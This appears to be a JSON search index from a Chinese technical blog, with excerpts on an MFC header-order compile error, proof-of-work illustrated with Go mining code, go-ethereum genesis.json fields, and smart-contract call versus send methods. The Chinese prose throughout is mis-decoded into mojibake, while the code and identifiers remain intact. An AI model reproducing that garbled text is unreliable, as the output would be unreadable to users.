app.cpp 1\u003ec:\\program files (x86)\\microsoft visual studio 10.0\\vc\\atlmfc\\include\\afxv_w32.h(16): fatal error C1189: #error : WINDOWS.H already included. MFC apps must not #include \u003cwindows.h\u003e ","date":"2022-07-12","objectID":"/error--windows.h-already-included/:1:0","tags":["vc++"],"title":"Error : WINDOWS.H Already Included","uri":"/error--windows.h-already-included/"},{"categories":["windows"],"content":"è§£å†³æ–¹æ³• ç»è¿‡ä¸€ç•ªæŠ˜è…¾, ç›´æ¥è¯´ç»“è®º: #include â€œstdafx.hâ€ å¿…é¡»æ”¾åœ¨å…¶ä»–å¤´æ–‡ä»¶ä¹‹å‰ è¿™æ¶‰åŠåˆ°ä¸€ä¸ªå¾ˆæ¶å¿ƒçš„é—®é¢˜, å¦‚æœå¤šä¸ªå¤´æ–‡ä»¶å±‚å±‚include, å¾—è€å¿ƒåœ°æ…¢æ…¢è°ƒæ•´é¡ºåº ","date":"2022-07-12","objectID":"/error--windows.h-already-included/:2:0","tags":["vc++"],"title":"Error : WINDOWS.H Already Included","uri":"/error--windows.h-already-included/"},{"categories":["windows"],"content":"ä¸¾ä¾‹ æ¯”å¦‚ ä¸‹é¢è¿™ä¸ªå°±ä¼šæŠ¥é”™: //a.h #include \"b.h\" #include \"c.h\" //b.h #include \"xxx.h\" //c.h #include \"yyy.h\" #include \"stdafx.h\" éœ€è¦è°ƒæ•´2å¤„: 1, c.h ä¸­ #include \"stdafx.h\" éœ€è¦æ”¾åˆ° #include \"yyy.h\" å‰é¢ 2, a.h ä¸­ #include \"c.h\" éœ€è¦æ”¾åˆ° #include \"b.h\" å‰é¢ æœ€åè¿™æ ·: //a.h #include \"c.h\" #include \"b.h\" //b.h #include \"xxx.h\" //c.h #include \"stdafx.h\" #include \"yyy.h\" ","date":"2022-07-12","objectID":"/error--windows.h-already-included/:3:0","tags":["vc++"],"title":"Error : WINDOWS.H Already Included","uri":"/error--windows.h-already-included/"},{"categories":["Blockchain"],"content":"â€œå¦‚ä½•è¾¾æˆå…±è¯†\"æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸€ä¸ªæœ€åŸºæœ¬çš„é—®é¢˜. åŒºå—é“¾ä½œä¸ºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿ, è¿™ä¹Ÿæ˜¯æœ€æ ¸å¿ƒçš„é—®é¢˜. å…±è¯†ç®—æ³•å¾ˆå¤š, PoWã€ BFT ã€POS .. ä»¥åŠçš„å˜ä½“, æ¯”å¦‚PBFTã€ IBFTã€Tendermintã€DPoSã€ HotStuff ç­‰. ä½†ä½œä¸ºåŒºå—é“¾çš„é¼»ç¥–çš„BTCå’Œå…ƒè€çš„ETHéƒ½ä½¿ç”¨çš„PoW, ETHæ­£åœ¨è¿‡åº¦åˆ°PoS, å¦å¤–æœ‰ä¸€äº›åŒºå—é“¾é‡‡ç”¨äº†PoSçš„ä¸€ä¸ªå˜ä½“DPoS.æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™å‡ ç§. ä»Šå¤©å…ˆè¯´è¯´PoW ","date":"2022-07-08","objectID":"/pow/:0:0","tags":["pow","consensus"],"title":"PoW","uri":"/pow/"},{"categories":["Blockchain"],"content":"åŸç† PoW Proof of Work å·¥ä½œé‡è¯æ˜ åœ¨æŒ–çŸ¿çš„æ—¶å€™é€šè¿‡ä½œå‡º\"ä¸€å®šçš„å·¥ä½œé‡\"æ¥å¢åŠ ä½œæ¶æˆæœ¬. å…¶åŸºæœ¬åŸç†æ˜¯é€šè¿‡ä¸€ä¸ªç®€å•ä½†åˆè´¹åŠ›çš„æ•°å­¦è®¡ç®—æ¥ä½“ç°å·¥ä½œé‡. è¿™æ ·çš„æ•°å­¦è®¡ç®—æœ‰å¾ˆå¤š, æ¯”å¦‚è´¨å› æ•°åˆ†è§£, è®¡ç®—hashç­‰. ","date":"2022-07-08","objectID":"/pow/:1:0","tags":["pow","consensus"],"title":"PoW","uri":"/pow/"},{"categories":["Blockchain"],"content":"Hash å“ˆå¸Œå‡½æ•°ç”¨äºä¸ºä»»æ„é•¿çš„è¾“å…¥å­—ç¬¦ä¸²åˆ›å»ºå›ºå®šé•¿åº¦çš„æ‘˜è¦,æœ‰å„ç§ç³»åˆ—çš„å“ˆå¸Œå‡½æ•°ï¼Œå¦‚MDã€SHA1ã€SHA-2ã€SHA-3ã€RIPEMDå’ŒWhirlpool ç‰¹ç‚¹: å“ˆå¸Œå‡½æ•°å¿…é¡»èƒ½å¤Ÿæ¥å—ä»»ä½•é•¿åº¦çš„è¾“å…¥æ–‡æœ¬ï¼Œå¹¶è¾“å‡ºä¸€ä¸ªå›ºå®šé•¿åº¦çš„å‹ç¼©ä¿¡æ¯. å“ˆå¸Œå‡½æ•°çš„è®¡ç®—é€Ÿåº¦éå¸¸å¿«ã€‚å¦‚æœæ¶ˆæ¯å¤ªå¤§ï¼Œæ•ˆç‡å¯èƒ½ä¼šä¸‹é™ï¼Œä½†è¯¥å‡½æ•°ä»åº”è¶³å¤Ÿå¿«ï¼Œä»¥æ»¡è¶³å®é™…ä½¿ç”¨ å“ˆå¸Œå‡½æ•°çš„è¾“å‡ºå¿…é¡»çš„ç¨³å®šçš„, è¾“å…¥ä¸å˜æ—¶è¾“å‡ºä¹Ÿä¸ä¼šå‘ç”Ÿå˜åŒ– å“ˆå¸Œä¸èƒ½åå‘æ¨å¯¼. ä¹Ÿå°±æ˜¯è¯´å¾ˆéš¾é€šè¿‡å“ˆå¸Œå€¼åå‘è®¡ç®—å‡ºåŸå§‹å€¼. è¿™ä¸ªå«åŸåƒé˜²å¾¡æˆ–è€…å«å•å‘å±æ€§ ä¸åŒçš„ä¿¡æ¯è¦å¾—åˆ°ä¸åŒçš„å“ˆå¸Œå€¼. è¿™å«æŠ—ç¢°æ’æ€§ å®é™…ä¸Š, è¾“å…¥ä¿¡æ¯ç¨åŠ æ”¹å˜, è¾“å‡ºçš„å“ˆå¸Œå€¼å°†ä¼šæœ‰å¾ˆå¤§çš„å·®å¼‚. è¿™å« é›ªå´©æ•ˆåº” æˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨çš„æ˜¯ SHA-256 ä¸¾ä¾‹ OSX MP16 ~ â¯ echo \"this is a test\" | openssl dgst -sha256 91751cee0a1ab8414400238a761411daa29643ab4b8243e9a91649e25be53ada OSX MP16 ~ â¯ echo \"this is A test\" | openssl dgst -sha256 215ec5072f0ae6f05d9576d42c1a3fb5794aa51199cb44e7d087e679ff000d1 ","date":"2022-07-08","objectID":"/pow/:2:0","tags":["pow","consensus"],"title":"PoW","uri":"/pow/"},{"categories":["Blockchain"],"content":"Hashè§£å¯†æ¸¸æˆ å‡è®¾æœ‰è¿™æ ·ä¸€ä¸ªæ¸¸æˆ: ç»™å®šä¸€ä¸ªå¸¸é‡å­—ç¬¦ä¸²str, å†åŠ ä¸Šä¸€ä¸ªå¯å˜æ•°å­—num å¾—åˆ° str+num, é€šè¿‡ä¸æ–­å˜åŒ–numçš„å€¼, ä½¿å¾— hash(str+num)å¾—åˆ°çš„å“ˆå¸Œå€¼æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ å°±ç®—æˆåŠŸ. å‡è®¾æˆ‘ä»¬éœ€è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯: å“ˆå¸Œå€¼ä»¥0000å¼€å¤´ func main() { str := \"this is a test string\" num := 0 for true { tempStr := str + strconv.Itoa(num) h := sha256.New() h.Write([]byte(tempStr)) sum := h.Sum(nil) s := hex.EncodeToString(sum) fmt.Println(\"try:\" + s) if s[0:4] == \"0000\" { fmt.Println(\"æ‰¾åˆ°num: \", num) fmt.Println(\"æ‰¾åˆ°hash: \", s) break } num++ } } è¿è¡Œç»“æœ: try:2717e2d84df58353433bdef467f5f12766710aedc7114d409d04d6712b670edb try:a13b43128c8961d36d9f7aca7fd82018497d713e5305e86f1ba6c900e7870e61 try:5a968dcad3ab8564046abedff836a91242d77207b758f079865680b96e9e9b3a ... ... æ‰¾åˆ°num: 7521 æ‰¾åˆ°hash: 0000e87f07402bc7592d63fc8876fc4685eb52649ceefa78915b33d7792be1f0 ç»è¿‡ä¸ƒåƒå¤šæ¬¡å°è¯•, æ‰¾åˆ°äº†å½“numä¸º7521æ—¶, æ»¡è¶³æ¡ä»¶ ","date":"2022-07-08","objectID":"/pow/:3:0","tags":["pow","consensus"],"title":"PoW","uri":"/pow/"},{"categories":["Blockchain"],"content":"PoW ä¸Šé¢æ¸¸æˆä¸­çš„ç»™å®šå­—ç¬¦ä¸²å°±ç®—æŒ–çŸ¿æ˜¯çš„åŒºå—\"å¯†å°å‰\"çš„å“ˆå¸Œå€¼ ,åŒ…å«å‰é¢çš„åŒºå—çš„å“ˆå¸Œå€¼å’Œäº¤æ˜“æ•°æ®ä»¥åŠå…¶å®ƒä¿¡æ¯è®¡ç®—å‡ºæ¥çš„å“ˆå¸Œå€¼, ä½†è¿˜æ²¡æœ‰æˆåŠŸæŒ–çŸ¿,æ‰€ä»¥è¿˜æ²¡åŒ…å«æœ¬åŒºå—çš„nonceç­‰. æŒ–çŸ¿æˆåŠŸå, ä¼šè¿›è¡Œå¯†å°(Seal). è¿™é‡Œè¯´çš„nonceä¹Ÿå°±æ˜¯ä¸Šé¢æ¸¸æˆä¸­çš„num æ¸¸æˆä¸­è¿˜æåˆ° ä¸€å®šçš„æ¡ä»¶ , åœ¨Powä¸­, ä¸€å®šçš„æ¡ä»¶å°±æ˜¯æ‰¾åˆ°çš„å“ˆå¸Œå€¼å°äºæŒ‡å®šçš„ target , targetæ˜¯æ ¹æ® éš¾åº¦ è®¡ç®—å‡ºæ¥çš„. æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°è¿™æ ·ä¸€ä¸ªç®€åŒ–ç‰ˆæœ¬çš„ PoWè¿‡ç¨‹ package main import ( \"crypto/sha256\" \"fmt\" \"math/big\" \"strconv\" \"time\" ) func getTarget() *big.Int { //å‡è®¾å½“å‰éš¾åº¦å€¼ difficulty := 22341680 two256 := new(big.Int).Exp(big.NewInt(2), big.NewInt(256), big.NewInt(0)) return new(big.Int).Div(two256, big.NewInt(int64(difficulty))) } // getBlockHashBeforeSeal è·å–åŒºå—åœ¨\"å¯†å°å‰\"çš„å“ˆå¸Œå€¼ func getBlockHashBeforeSeal() []byte { str := \"1312af178c253f84028d480a6adc1e25e81caa44c749ec81976192e2ec934c64\" //convert to bytes[] b := []byte(str) return b } func hash(s []byte) []byte { //ä½¿ç”¨sha256å“ˆå¸Œå‡½æ•° h := sha256.New() h.Write(s) sum := h.Sum(nil) return sum } func mine() uint64 { nonce := 0 target := getTarget() fmt.Println(\"target: \", target) powBuffer := new(big.Int) //æ—·å·¥æŒ–çŸ¿ï¼Œéœ€è¦è¿›è¡Œæš´åŠ›éå† //é€šè¿‡ä¸åœåœ°æ”¹å˜nonceä»¥ä¾¿è®©hashå€¼å˜åŒ–ï¼Œç„¶åæ‰¾åˆ°åˆšå¥½æ»¡è¶³ä¸€å®šæ¡ä»¶çš„å€¼ for true { var bytes = append(getBlockHashBeforeSeal(), strconv.Itoa(nonce)...) sum := hash(bytes) if powBuffer.SetBytes(sum).Cmp(target) \u003c 0 { fmt.Println(\"æ‰¾åˆ°nonce: \", nonce) break } nonce++ } return uint64(nonce) } func verify(nonce uint64) bool { //å¯¹æ—·å·¥æŒ–çŸ¿å¾—åˆ°çš„ç»“æœè¿›è¡ŒéªŒè¯ //éªŒè¯åªéœ€è¦è¿›è¡Œä¸€æ¬¡è®¡ç®— powBuffer := new(big.Int) target := getTarget() var bytes = append(getBlockHashBeforeSeal(), strconv.Itoa(int(nonce))...) sum := hash(bytes) return powBuffer.SetBytes(sum).Cmp(target) \u003c 0 } func main() { startTime := time.Now() nonce := mine() fmt.Println(\"è®¡ç®—è€—æ—¶: \", time.Now().Sub(startTime)) ok := verify(nonce) fmt.Println(\"éªŒè¯ç»“æœ: \", ok) } ","date":"2022-07-08","objectID":"/pow/:4:0","tags":["pow","consensus"],"title":"PoW","uri":"/pow/"},{"categories":["Blockchain"],"content":"go-etherum go-etherumçš„PoWç”¨åˆ°çš„ç®—æ³•åç§°å« Ethash å…¶æŒ–çŸ¿é€»è¾‘åœ¨ go-ethereum-1.10.20/consensus/ethash/sealer.go ä¸­çš„ mine æ–¹æ³• ","date":"2022-07-08","objectID":"/pow/:5:0","tags":["pow","consensus"],"title":"PoW","uri":"/pow/"},{"categories":["Blockchain"],"content":"å¯¹åˆ›ä¸–æ–‡ä»¶çš„ä»‹ç» åœ¨ https://yinhui1984.github.io/ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ /#ç¼–å†™åˆ›ä¸–æ–‡ä»¶ä¸­æåˆ°äº†genesis.json, å®ƒæ˜¯åŒºå—é“¾çš„åˆå§‹é…ç½®æ–‡ä»¶, ç§°ä¸ºåˆ›ä¸–æ–‡ä»¶, åŒºå—é“¾ä¸­çš„ç¬¬ä¸€ä¸ªå—(Block)éœ€è¦ç”¨å®ƒæ¥è¿›è¡Œç”Ÿæˆ. è¿™ä¸ªå—ç§°ä¸ºåˆ›ä¸–å— ","date":"2022-07-06","objectID":"/genesis.json/:0:0","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"Genesis struct åœ¨go-ethereumä¸­å®šä¹‰å¦‚ä¸‹: //go-ethereum-1.10.20/params/config.go type Genesis struct { Config *params.ChainConfig `json:\"config\"` Nonce uint64 `json:\"nonce\"` Timestamp uint64 `json:\"timestamp\"` ExtraData []byte `json:\"extraData\"` GasLimit uint64 `json:\"gasLimit\" gencodec:\"required\"` Difficulty *big.Int `json:\"difficulty\" gencodec:\"required\"` Mixhash common.Hash `json:\"mixHash\"` Coinbase common.Address `json:\"coinbase\"` Alloc GenesisAlloc `json:\"alloc\" gencodec:\"required\"` // These fields are used for consensus tests. Please don't use them // in actual genesis blocks. Number uint64 `json:\"number\"` GasUsed uint64 `json:\"gasUsed\"` ParentHash common.Hash `json:\"parentHash\"` BaseFee *big.Int `json:\"baseFeePerGas\"` } å…¶ä¸­ Configå­—æ®µ: //go-ethereum-1.10.20/params/config.go // ChainConfig is the core config which determines the blockchain settings. // // ChainConfig is stored in the database on a per block basis. This means // that any network, identified by its genesis block, can have its own // set of configuration options. type ChainConfig struct { ChainID *big.Int `json:\"chainId\"` // chainId identifies the current chain and is used for replay protection HomesteadBlock *big.Int `json:\"homesteadBlock,omitempty\"` // Homestead switch block (nil = no fork, 0 = already homestead) DAOForkBlock *big.Int `json:\"daoForkBlock,omitempty\"` // TheDAO hard-fork switch block (nil = no fork) DAOForkSupport bool `json:\"daoForkSupport,omitempty\"` // Whether the nodes supports or opposes the DAO hard-fork // EIP150 implements the Gas price changes (https://github.com/ethereum/EIPs/issues/150) EIP150Block *big.Int `json:\"eip150Block,omitempty\"` // EIP150 HF block (nil = no fork) EIP150Hash common.Hash `json:\"eip150Hash,omitempty\"` // EIP150 HF hash (needed for header only clients as only gas pricing changed) EIP155Block *big.Int `json:\"eip155Block,omitempty\"` // EIP155 HF block EIP158Block *big.Int `json:\"eip158Block,omitempty\"` // EIP158 HF block ByzantiumBlock *big.Int `json:\"byzantiumBlock,omitempty\"` // Byzantium switch block (nil = no fork, 0 = already on byzantium) ConstantinopleBlock *big.Int `json:\"constantinopleBlock,omitempty\"` // Constantinople switch block (nil = no fork, 0 = already activated) PetersburgBlock *big.Int `json:\"petersburgBlock,omitempty\"` // Petersburg switch block (nil = same as Constantinople) IstanbulBlock *big.Int `json:\"istanbulBlock,omitempty\"` // Istanbul switch block (nil = no fork, 0 = already on istanbul) MuirGlacierBlock *big.Int `json:\"muirGlacierBlock,omitempty\"` // Eip-2384 (bomb delay) switch block (nil = no fork, 0 = already activated) BerlinBlock *big.Int `json:\"berlinBlock,omitempty\"` // Berlin switch block (nil = no fork, 0 = already on berlin) LondonBlock *big.Int `json:\"londonBlock,omitempty\"` // London switch block (nil = no fork, 0 = already on london) ArrowGlacierBlock *big.Int `json:\"arrowGlacierBlock,omitempty\"` // Eip-4345 (bomb delay) switch block (nil = no fork, 0 = already activated) GrayGlacierBlock *big.Int `json:\"grayGlacierBlock,omitempty\"` // Eip-5133 (bomb delay) switch block (nil = no fork, 0 = already activated) MergeNetsplitBlock *big.Int `json:\"mergeNetsplitBlock,omitempty\"` // Virtual fork after The Merge to use as a network splitter // TerminalTotalDifficulty is the amount of total difficulty reached by // the network that triggers the consensus upgrade. TerminalTotalDifficulty *big.Int `json:\"terminalTotalDifficulty,omitempty\"` // Various consensus engines Ethash *EthashConfig `json:\"ethash,omitempty\"` Clique *CliqueConfig `json:\"clique,omitempty\"` } ","date":"2022-07-06","objectID":"/genesis.json/:1:0","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"ChainID åŒºå—é“¾ID, æ¯ä¸€ä¸ªå¯¹å¤–å…¬å¼€çš„é“¾IDæ˜¯å”¯ä¸€çš„, è¿™ä¸ªIDå¯ä»¥åœ¨https://chainlist.orgä¸Šè¿›è¡ŒæŸ¥è¯¢å’Œç”³è¯· ä¹‹æ‰€ä»¥åŠ è¿™æ ·ä¸€ä¸ªChainIDæ˜¯ä¸ºäº†é˜²æ­¢\"é‡æ”¾æ”»å‡»\":æ˜¯åœ¨ä¸€ä¸ªåŒºå—é“¾ä¸Šè¿›è¡Œäº¤æ˜“ï¼Œå¹¶æ¶æ„æˆ–æ¬ºè¯ˆæ€§åœ°åœ¨å¦ä¸€ä¸ªåŒºå—é“¾ä¸Šé‡å¤è¯¥äº¤æ˜“. å‚è€ƒè¿™é‡ŒEIP155 æˆ–è¿™é‡Œ EIP : Ethereum Improvement Proposals ä»¥å¤ªåŠæ”¹è¿›ææ¡ˆ ","date":"2022-07-06","objectID":"/genesis.json/:1:1","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"HomesteadBlock HomesteadBlock ä»¥åŠåé¢çš„å„ç§xxxBlockéƒ½æ˜¯æŒ‡çš„æ˜¯ETHçš„ç¡¬åˆ†å‰é«˜åº¦. å…³äºåˆ†å‰,å‚è€ƒè¿™é‡Œ è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸»ç½‘çš„åˆ†å‰å†å² : https://ethereum.org/en/history/ å¯¹äºæ–°å»ºæµ‹è¯•ç½‘è€Œè¨€, åº”è¯¥è®¾ç½®ä¸º0 , è¡¨ç¤ºä½ æ²¡æœ‰åˆ†å‰ ","date":"2022-07-06","objectID":"/genesis.json/:1:2","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"TerminalTotalDifficulty TTD, ç»ˆç«¯æ€»éš¾åº¦, ç½‘ç»œè¾¾åˆ°çš„æ€»éš¾åº¦ æœ€è¿‘æåˆ°TTDçš„ä¸€ä¸ªæ–°é—»æ˜¯ETHå°†åœ¨Ropstenæµ‹è¯•ç½‘çš„TTDè¾¾åˆ°ä¸€ä¸ªå€¼æ—¶è§¦å‘é“¾ä¸Šåˆå¹¶, ä»¥å°†å…¶POW(å·¥ä½œé‡è¯æ˜)å‡çº§ä¸ºPOS(æƒç›Šè¯æ˜, proof-of-stake) ","date":"2022-07-06","objectID":"/genesis.json/:1:3","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"Ethash Ethashæ˜¯Ethereumä½¿ç”¨çš„POWç®—æ³•ã€‚è¿™æ˜¯ç›®å‰ä¸»ç½‘ä½¿ç”¨çš„ç®—æ³•. å…·ä½“å‚è€ƒ https://ethereum.org/en/developers/docs/consensus-mechanisms/pow/mining-algorithms/ å’Œ https://ethereum.org/en/developers/docs/consensus-mechanisms/pow/mining-algorithms/ethash/ ä»¥åŠ https://ethereum.stackexchange.com/questions/14/what-proof-of-work-function-does-ethereum-use ","date":"2022-07-06","objectID":"/genesis.json/:1:4","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"Clique Clique [/kliËk/] æ˜¯æµ‹è¯•ç½‘ä½¿ç”¨çš„æƒç›Šè¯æ˜POS ç®—æ³•, ä¸»ç½‘ä¸€ç›´åœ¨åŠªåŠ›å°½å¿«åˆ‡æ¢åˆ°POS å…·ä½“å‚è€ƒè¿™é‡Œ https://ethereum.org/en/developers/docs/consensus-mechanisms/pos/ ","date":"2022-07-06","objectID":"/genesis.json/:1:5","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"Nonce å’Œ Mixhash Nonceæ˜¯ä¸€ä¸ª64ä½çš„å“ˆå¸Œå€¼, mixhashå­—æ®µåŒ…å«ä¸€ä¸ª256ä½çš„å“ˆå¸Œå€¼ï¼Œä¸€æ—¦ä¸nonceç»“åˆï¼Œå°±å¯ä»¥ç”¨æ¥è¯æ˜ä¸ºäº†åˆ›å»ºè¿™ä¸ªåŒºå—ï¼Œå·²ç»èŠ±è´¹äº†è¶³å¤Ÿçš„ç®—åŠ›. åé¢æç¯‡åšå®¢ä¸“é—¨æ¥è®²å·¥ä½œé‡è¯æ˜ ","date":"2022-07-06","objectID":"/genesis.json/:1:6","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"Timestamp Unixæ—¶é—´æˆ³ ã€‚åˆ©ç”¨å—ä¸å—ä¹‹é—´çš„æ—¶é—´æˆ³æ¥è°ƒæ•´éš¾åº¦, ä»¥ä¿è¯å‡ºå—æ—¶é—´çš„ç¨³å®šæ€§. æœ€åä¸¤ä¸ªå—ä¹‹é—´çš„è¾ƒå°å‘¨æœŸå¯¼è‡´éš¾åº¦çº§åˆ«å¢åŠ ï¼Œå› æ­¤éœ€è¦é¢å¤–çš„è®¡ç®—æ¥æ‰¾åˆ°ä¸‹ä¸€ä¸ªæœ‰æ•ˆå—ã€‚å¦‚æœå‘¨æœŸå¤ªå¤§ï¼Œåˆ™éš¾åº¦å’Œä¸‹ä¸€ä¸ªåŒºå—çš„é¢„æœŸæ—¶é—´ä¼šé™ä½ã€‚æ—¶é—´æˆ³è¿˜å…è®¸éªŒè¯é“¾ä¸­å—çš„é¡ºåº. ","date":"2022-07-06","objectID":"/genesis.json/:1:7","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"ExtraData é¢å¤–æ•°æ®. æƒ³å†™å…¥åŒºå—é“¾çš„ä»»æ„æ•°æ®, ä½†åªæœ‰32 ä¸ªå­—èŠ‚ ","date":"2022-07-06","objectID":"/genesis.json/:1:8","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"GasLimit æ¯ä¸ªåŒºå—çš„Gasæ”¯å‡ºé™é¢ ","date":"2022-07-06","objectID":"/genesis.json/:1:9","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"Difficulty éš¾åº¦. å®ƒä»£è¡¨äº†è¯æ˜PoWæ‰€éœ€çš„å“ˆå¸Œå€¼çš„éš¾åº¦ç­‰çº§ã€‚ å®ƒå®šä¹‰äº†æŒ–çŸ¿ç›®æ ‡ï¼Œå¯ä»¥æ ¹æ®å‰ä¸€ä¸ªåŒºå—çš„éš¾åº¦çº§åˆ«å’Œæ—¶é—´æˆ³æ¥è®¡ç®—ã€‚éš¾åº¦è¶Šé«˜ï¼ŒçŸ¿å·¥ä¸ºäº†å‘ç°æœ‰æ•ˆåŒºå—å¿…é¡»æ‰§è¡Œçš„ç»Ÿè®¡è®¡ç®—å°±è¶Šå¤šã€‚è¯¥å€¼ç”¨äºæ§åˆ¶åŒºå—é“¾çš„å‡ºå—æ—¶é—´ï¼Œä½¿å‡ºå—é¢‘ç‡ä¿æŒåœ¨ç›®æ ‡èŒƒå›´å†… ","date":"2022-07-06","objectID":"/genesis.json/:1:10","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"Coinbase è¿™æ˜¯ä¸€ä¸ª160ä½çš„åœ°å€ï¼ŒæŒ–çŸ¿æˆåŠŸåï¼ŒæŒ–çŸ¿å¥–åŠ±å°±ä¼šå‘é€åˆ°è¿™é‡Œã€‚ æœ‰äº›åœ°æ–¹ç§°ä¹‹ä¸º Etherbase, æ¯”å¦‚ miner.setEtherbase(personal.listAccounts[0]) ","date":"2022-07-06","objectID":"/genesis.json/:1:11","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"alloc è¿™ä¸ªå‚æ•°åŒ…å«é¢„å…ˆåˆ†é…çš„é’±åŒ…å’Œä½™é¢åˆ—è¡¨. åˆå§‹åŒ–åŒºå—é“¾çš„æ—¶å€™, è¿™ä¸ªå‚æ•°å¿…é¡»è¢«å¡«å†™, å¦åˆ™æ²¡é’±æ”¯ä»˜æŒ–çŸ¿è´¹ç”¨, äº§ç”Ÿä¸äº†å—. ","date":"2022-07-06","objectID":"/genesis.json/:1:12","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"Number, GasUsed, ParentHash, BaseFee // These fields are used for consensus tests. Please don't use them // in actual genesis blocks. ","date":"2022-07-06","objectID":"/genesis.json/:1:13","tags":["genesis.json"],"title":"genesis.json","uri":"/genesis.json/"},{"categories":["Blockchain"],"content":"ä»‹ç»äº†è°ƒç”¨æ™ºèƒ½åˆçº¦ä¸­\"è¯»æ–¹æ³•\"ä¸\"å†™æ–¹æ³•\"çš„åŒºåˆ« ","date":"2022-07-04","objectID":"/%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E8%AF%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%99%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/:0:0","tags":["web3.py","web3.js"],"title":"å¯¹æ™ºèƒ½åˆçº¦çš„è¯»æ–¹æ³•å’Œå†™æ–¹æ³•çš„è°ƒç”¨","uri":"/%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E8%AF%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%99%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/"},{"categories":["Blockchain"],"content":"æ–¹æ³•(å‡½æ•°)çš„åˆ†ç±» æ™ºèƒ½åˆçº¦ä¸­çš„æ–¹æ³•å¯ä»¥ç²—æš´çš„åˆ†ä¸ºä¸¤ç±»: ä¸ä¼šæ”¹å˜è™šæ‹ŸæœºçŠ¶æ€çš„æ–¹æ³• ä¼šæ”¹å˜è™šæ‹ŸæœºçŠ¶æ€çš„æ–¹æ³• å‡è®¾æˆ‘ä»¬å°†ä»–ä»¬ç§°ä¸º\"è¯»æ–¹æ³•\"å’Œ\"å†™æ–¹æ³•\", é‚£ä¹ˆè¯»æ–¹æ³•è€Œè¨€, å…¶æ˜¯ä¸ä¼šåˆ›å»ºäº¤æ˜“å’ŒèŠ±è´¹GASçš„, æ˜¯å…è´¹çš„. å¯¹äºå†™æ–¹æ³•è€Œè¨€, éœ€è¦æ”¶å–â€™æ‰‹ç»­è´¹â€™è¿›è¡ŒæŒ–çŸ¿çš„. å…³é”®å­— æè¿° æ”¹å˜è™šæ‹ŸæœºçŠ¶æ€? pure ä¸è¯»æ•°æ®, ä¹Ÿä¸å†™æ•°æ® NO view è¯»æ•°æ®, ä½†ä¸å†™æ•°æ® NO payable æ”¯ä»˜ä»¥å¤ª, è‚¯å®šå†™æ•°æ® YES æœªæ˜ç¡®æŒ‡ç¤ºçš„ å…¶å®ƒå¯èƒ½å†™æ•°æ®çš„ YES ","date":"2022-07-04","objectID":"/%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E8%AF%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%99%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/:1:0","tags":["web3.py","web3.js"],"title":"å¯¹æ™ºèƒ½åˆçº¦çš„è¯»æ–¹æ³•å’Œå†™æ–¹æ³•çš„è°ƒç”¨","uri":"/%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E8%AF%BB%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%99%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/"},{"categories":["Blockchain"],"content":"Web3.jsçš„ call() ä¸Send() å¯¹äºä¸Šé¢ä¸¤ç±»æ–¹æ³•, Web3.jsä¸­åˆ†åˆ«å¯¹åº”Callæ–¹æ³•å’ŒSendæ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨ åˆ›å»ºäº¤æ˜“ æ”¹å˜è™šæ‹ŸæœºçŠ¶æ€ Call() NO NO Send() YES YES å®é™…ä¸Šä»è¯­æ³•å±‚é¢ä¸Šè€Œè¨€, æ— è®ºæ˜¯è¯»æ–¹æ³•è¿˜æ˜¯å†™æ–¹æ³•, éƒ½å¯ä»¥è°ƒç”¨ call , ä½†å¯¹äºå†™æ–¹æ³•, è°ƒç”¨callè™šæ‹ŸæœºçŠ¶æ€å¹¶ä¸ä¼šæ”¹å˜, å¹¶ä¸”ä¸ä¼šæŠ¥é”™. 